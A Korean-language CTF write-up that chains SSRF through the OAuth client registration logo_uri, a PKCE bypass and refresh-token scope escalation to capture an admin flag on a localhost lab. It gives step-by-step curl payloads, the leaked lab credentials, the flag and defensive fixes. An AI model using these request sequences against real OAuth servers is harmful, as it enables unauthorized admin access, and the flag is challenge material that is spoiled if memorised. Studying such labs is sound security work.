# OAuth CTF Advanced - Writeup

## 1. Flag 획득
**FLAG**: `MSG{0auth_2_MSG_FLAG_m4st3r}`

---

## 2. 취약점 요약
- SSRF (Server-Side Request Forgery)
- PKCE Bypass
- Scope Escalation via Refresh Token

---

## 3. 공격 과정

### Step 1: SSRF 취약점 발견

**Dynamic Client Registration 테스트**:
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test Client",
    "redirect_uris": ["http://localhost:8080/callback"],
    "logo_uri": "http://auth-server:8000/"
  }'
```

**발견**: `logo_uri`가 서버 측에서 요청되어 응답이 반환됨 (SSRF 취약점)

---

### Step 2: robots.txt 확인

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Attacker",
    "logo_uri": "http://auth-server:8000/robots.txt"
  }'
```

**획득 정보**:
- `Disallow: /internal/admin/` 발견
- 내부 관리 엔드포인트 존재 확인

---

### Step 3: OAuth Discovery Endpoint 분석

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Attacker",
    "logo_uri": "http://auth-server:8000/.well-known/oauth-authorization-server"
  }'
```

**획득 정보**:
- `"internal_documentation": "/internal/admin/"` 발견
- `"debug_mode": "development"` 확인 (개발 환경)

---

### Step 4: 메인 페이지 HTML 소스 분석

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Attacker",
    "logo_uri": "http://auth-server:8000/"
  }'
```

**획득 정보**:
- HTML 주석에서 `<!-- DEV NOTE: Test credentials stored in /internal/admin/dev-config.json -->` 발견
- 구체적인 파일명 획득: `dev-config.json`

---

### Step 5: 개발 설정 파일 접근

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Attacker",
    "logo_uri": "http://auth-server:8000/internal/admin/dev-config.json"
  }'
```

**획득 정보**:
- Admin 계정: `MSG_CTF_HACKER` / `Wh3r3_is_SSRF?!`
- Trusted Client: `msg_developer_portal` / `dev_portal_secret_2024`

---

### Step 6: Admin 계정으로 OAuth 인증

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/authorize \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=msg_developer_portal" \
  -d "redirect_uri=http://localhost:8080/auth/callback" \
  -d "response_type=code" \
  -d "scope=read" \
  -d "state=random_state" \
  -d "username=MSG_CTF_HACKER" \
  -d "password=Wh3r3_is_SSRF?!" \
  -d "action=login" \
  -i
```

**결과**: Authorization Code 획득 (302 Redirect 헤더에서 추출)

---

### Step 7: PKCE Bypass - Token 교환

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=[AUTHORIZATION_CODE]" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "redirect_uri=http://localhost:8080/auth/callback"
```

**취약점**: Trusted Client는 `code_verifier` 없이 토큰 교환 가능

**결과**: Access Token + Refresh Token 획득 (scope: read)

---

### Step 8: Scope Escalation

**요청**:
```bash
curl -X POST http://localhost:8080/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=[REFRESH_TOKEN]" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=ADMIN_SECRETS"
```

**취약점**: Refresh Token으로 임의의 스코프 요청 가능

**결과**: `ADMIN_SECRETS` 스코프를 가진 Access Token 획득

---

### Step 9: Flag 획득

**요청**:
```bash
curl -X GET http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer [ACCESS_TOKEN]"
```

**검증 단계**:
- ✅ Bearer Token 검증
- ✅ `ADMIN_SECRETS` 스코프 검증
- ✅ **Admin 계정 검증** (`user_id == 'user_admin_001'`)

**응답**:
```json
{
  "success": true,
  "message": "Administrative access granted",
  "flag": "MSG{0auth_2_MSG_FLAG_m4st3r}",
  "user_id": "user_admin_001",
  "access_level": "ADMIN_SECRETS"
}
```

**중요**: Admin 계정(`MSG_CTF_HACKER`)으로 로그인하지 않으면 `403 Forbidden` 에러 발생

---

## 4. 자동화 스크립트

전체 공격 체인을 자동화한 Python 스크립트:

```bash
python docs/solve_real_final.py
```

---

## 5. 방어 방안

1. **SSRF 방지**
   - URL 프로토콜 제한 (http/https만 허용)
   - 내부 IP 범위 차단 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - DNS 리바인딩 방지

2. **PKCE 강제**: 모든 클라이언트에 PKCE 적용 (Trusted Client 예외 제거)

3. **Scope 검증**: Refresh Token 사용 시 원본 스코프 범위 내로 제한

4. **역할 기반 접근 제어**
   - Admin 엔드포인트는 Admin 계정(`user_id`) 검증 필수
   - Scope뿐만 아니라 사용자 역할도 검증

---

**Date**: 2025-11-05
**Challenge**: OAuth CTF Advanced
**Difficulty**: Medium
